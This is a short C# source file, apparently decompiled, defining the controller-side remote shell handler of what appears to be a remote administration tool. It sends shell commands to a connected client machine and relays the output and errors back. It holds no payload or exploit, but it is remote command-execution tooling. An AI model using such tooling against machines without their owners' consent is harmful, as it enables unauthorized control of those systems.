

using InvokedCommon.Messages;
using InvokedCommon.Networking;
using System.Threading;


namespace InvokedServer.Messages
{
	public class RemoteShellHandler : MessageProcessorBase<string>
	{
		private readonly InvokedServer.Networking.Client _client;

		public event RemoteShellHandler.CommandErrorEventHandler CommandError;

		private void OnCommandError(string errorMessage)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				RemoteShellHandler.CommandErrorEventHandler commandError = this.CommandError;
				if (commandError == null)
					return;
				commandError((object)this, (string)val);
			}), (object)errorMessage);
		}

		public RemoteShellHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
		}

		public override bool CanExecute(IMessage message) => message is DoShellExecuteResponse;

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			if (!(message is DoShellExecuteResponse message1))
				return;
			this.Execute(sender, message1);
		}

		public void SendCommand(string command)
		{
			this._client.Send<DoShellExecute>(new DoShellExecute()
			{
				Command = command
			});
		}

		private void Execute(ISender client, DoShellExecuteResponse message)
		{
			if (message.IsError)
				this.OnCommandError(message.Output);
			else
				this.OnReport(message.Output);
		}

		public delegate void CommandErrorEventHandler(object sender, string errorMessage);
	}
}